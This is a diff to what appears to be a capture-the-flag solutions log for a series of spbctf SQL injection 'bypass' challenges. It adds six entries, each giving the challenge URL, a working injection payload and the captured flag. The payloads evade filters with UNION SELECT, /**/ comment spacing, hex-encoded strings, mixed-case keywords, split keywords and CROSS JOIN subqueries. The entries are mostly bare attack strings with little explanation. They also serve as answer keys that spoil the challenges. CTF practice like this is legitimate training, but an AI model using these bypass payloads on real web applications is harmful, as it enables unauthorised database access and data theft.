@@ -1192,3 +1192,60 @@ spbctf{f1r57_bypa55}
 ->
 
 spbctf{7f95f2e1d57eb5605e77a48f735e60f5}
+
+52) http://kslweb1.spb.ctf.su/sqli/bypass3/
+
+http://kslweb1.spb.ctf.su/sqli/bypass3/?product_id=-1%20UNION%20SELECT%201,2,(SELECT%20flag%20FROM%20flag)
+
+->
+
+spbctf{63ddd1876f0f8fa8}
+
+53) http://kslweb1.spb.ctf.su/sqli/bypass4/
+
+https://tools.onecompiler.com/string-to-hex
+b548d45080b9d110 -> STR TO HEX -> 0x62353438643435303830623964313130
+
+-1/**/UNION/**/SELECT/**/*/**/FROM/**/flags/**/WHERE/**/name/**/LIKE/**/0x62353438643435303830623964313130
+
+->
+
+spbctf{65bf992073ff5b30a2eb10b0d04d9110}
+
+54) http://kslweb1.spb.ctf.su/sqli/bypass5/
+
+STR TO HEX
+
+3f1a76e536a0a805 -> 0x33663161373665353336613061383035
+
+200 UNION SeLECT id, name, flag FROM flags WHERE name like 0x33663161373665353336613061383035
+
+->
+
+spbctf{ecdab8d55512b3a70c367f392b2f3a89}
+
+55) http://kslweb1.spb.ctf.su/sqli/bypass6/
+
+200 UNION SELeCT * FROM (SELeCT 1) a CROSS JOIN (SELeCT 2) b CROSS JOIN (SELeCT flag from flag) c
+
+->
+
+spbctf{y34h_impo55ible_7ask_d0ne}
+
+56) http://kslweb1.spb.ctf.su/sqli/bypass7/
+
+200 UNION SEL/ECT * FROM (SEL/ECT 1) a CROSS JOIN (SEL/ECT 2) b CROSS JOIN (SEL/ECT flag from flag) c
+
+->
+
+spbctf{selselselectectect_me_nonononowwww}
+
+57) http://kslweb1.spb.ctf.su/sqli/bypass8/
+
+https://textcompare.io/string-to-int-converter
+
+200 UNION SELECT id, name, flag FROM flags WHERE name BETWEEN 9 AND 9 LIMIT 1 OFFSET 12
+
+->
+
+spbctf{7a9cc937ed8c991f5fc5a87931810468}
